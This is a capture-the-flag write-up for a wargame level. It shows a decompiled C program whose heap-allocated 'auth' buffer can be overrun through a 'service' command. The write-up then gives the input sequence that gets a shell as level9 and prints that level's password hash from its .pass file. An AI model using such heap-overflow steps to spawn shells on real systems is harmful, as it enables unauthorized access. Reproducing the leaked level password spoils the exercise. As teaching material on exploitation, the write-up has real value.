```C

char *auth;
int  service;

int  main(int argc, const char **argv, const char **envp)
{
  char s[5];     // [esp+20h] [ebp-88h] 
  char v5[2];    // [esp+25h] [ebp-83h] 
  char v6[129];  // [esp+27h] [ebp-81h] 

  while (1)
  {
    printf("%p, %p \n", auth, &service);

    if (!fgets(s, 128, stdin))
        break;
    if (!memcmp(s, "auth ", 5))
    {
        auth = (char *)malloc(4);
        *auth = 0;

        if (strlen(v5) <= 0x1E)
            strcpy(auth, v5);
    }

    if (!memcmp(s, "reset", 5))
        free(auth);

    if (!memcmp(s, "service", 6))
        service = (int)strdup(v6);

    if (!memcmp(s, "login", 5))
    {
        if (*(auth + 32))
            system("/bin/sh");
        else
            fwrite("Password:\n", 1, 0xAu, stdout);
    }
  }
  return 0;
}
```

- The global variable auth is allocated with malloc(4)   -> 0x804a008
- The global variable service is allocared with strdup() -> 0x804a018

We see that there is 16 bytes between auth and service. We want the 32th bytes after auth to be different than 0. 

```bash
> auth     # 0x804a008

> serviceABCDEFGHIJKLMNOP  # Writing enough character so auth[32] is different than 0 (The buffer 's' will overwrite 'v6' that is actually strdup in 'service' memory space)

> login

$ whoami
level9

$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```